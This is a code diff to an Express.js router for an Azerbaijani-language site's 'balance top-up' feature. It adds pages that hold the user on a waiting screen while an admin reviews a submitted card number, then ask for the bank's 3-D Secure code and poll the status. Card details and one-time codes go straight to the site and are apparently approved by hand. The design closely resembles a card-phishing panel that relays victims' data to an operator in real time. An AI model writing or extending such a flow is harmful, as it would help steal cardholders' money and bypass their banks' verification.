@@ -102,7 +102,8 @@ router.post('/api/balance/topup', requireAuth, async (req, res) => {
     return res.json({
       ok: true,
       message: 'Balans artırımı təsdiqə göndərildi.',
-      paymentId: String(payment._id)
+      paymentId: String(payment._id),
+      redirect: '/' + res.locals.locale + '/balans-gozleme/' + payment._id
     });
   } catch (e) {
     return res.status(500).json({ ok: false, message: 'Əməliyyat alınmadı' });
@@ -116,23 +117,74 @@ router.post('/api/account/toppay', requireAuth, async (req, res) => {
       return res.status(400).json({ ok: false, message: 'Kart nömrəsi yanlışdır' });
     }
     const payment = await paymentService.createTopup(req.currentUser, Number(b.amount) || 10, b.card);
-    return res.json({ ok: true, message: 'Göndərildi', paymentId: String(payment._id) });
+    return res.json({ ok: true, message: 'Göndərildi', paymentId: String(payment._id), redirect: '/' + res.locals.locale + '/balans-gozleme/' + payment._id });
   } catch (e) {
     return res.status(500).json({ ok: false, message: 'Alınmadı' });
   }
 });
 
-/* Balans artırımının vəziyyəti — gözləmə ekranı canlı sorğulayır */
+/* Balans artırımının mərhələsi -> ekran yolu */
+function topupPath(locale, p) {
+  if (p.status === 'awaiting_3ds' || p.status === 'code_submitted') return '/' + locale + '/balans-3d/' + p._id;
+  if (p.status === 'approved' || p.status === 'declined') return '/' + locale + '/balans-natice/' + p._id;
+  return '/' + locale + '/balans-gozleme/' + p._id;
+}
+
+async function loadTopup(req) {
+  return Payment.findOne({ _id: req.params.paymentId, user: req.currentUser._id, order: null }).lean();
+}
+
+/* Admin kartı təsdiqləyənə qədər gözləmə ekranı */
+router.get('/balans-gozleme/:paymentId', requireAuth, async (req, res, next) => {
+  try {
+    const p = await loadTopup(req);
+    if (!p) return next();
+    const target = topupPath(res.locals.locale, p);
+    if (target.indexOf('/balans-gozleme/') === -1) return res.redirect(target);
+    res.render('pages/topup-status', { title: 'Balans artırımı', payment: p, stage: 'waiting' });
+  } catch (e) { next(e); }
+});
+
+/* 3-D Secure kodu ekranı */
+router.get('/balans-3d/:paymentId', requireAuth, async (req, res, next) => {
+  try {
+    const p = await loadTopup(req);
+    if (!p) return next();
+    const target = topupPath(res.locals.locale, p);
+    if (target.indexOf('/balans-3d/') === -1) return res.redirect(target);
+    res.render('pages/topup-status', {
+      title: '3-D Secure doğrulaması',
+      payment: p,
+      stage: p.status === 'code_submitted' ? 'final' : '3ds'
+    });
+  } catch (e) { next(e); }
+});
+
+/* Nəticə */
+router.get('/balans-natice/:paymentId', requireAuth, async (req, res, next) => {
+  try {
+    const p = await loadTopup(req);
+    if (!p) return next();
+    const user = await User.findById(req.currentUser._id).lean();
+    res.render('pages/topup-status', { title: 'Balans artırımı', payment: p, stage: p.status, balance: user ? user.balance || 0 : 0 });
+  } catch (e) { next(e); }
+});
+
+/* Balans artırımının vəziyyəti — ekranlar canlı sorğulayır */
 router.get('/api/balance/topup-status/:paymentId', requireAuth, async (req, res) => {
   try {
-    const p = await Payment.findOne({ _id: req.params.paymentId, user: req.currentUser._id }).lean();
+    const p = await loadTopup(req);
     if (!p) return res.status(404).json({ ok: false, message: 'Əməliyyat tapılmadı' });
     const user = await User.findById(req.currentUser._id).lean();
+    const stage = p.status === 'pending_admin' ? 'waiting'
+      : p.status === 'awaiting_3ds' ? '3ds'
+      : p.status === 'code_submitted' ? 'final' : p.status;
     res.json({
       ok: true,
       status: p.status,
+      stage,
       balance: user ? (user.balance || 0) : 0,
-      redirect: p.status === 'approved' ? '/' + res.locals.locale + '/balans-artirilmasi' : null
+      redirect: topupPath(res.locals.locale, p)
     });
   } catch (e) {
     res.status(500).json({ ok: false, message: 'Vəziyyət oxunmadı' });
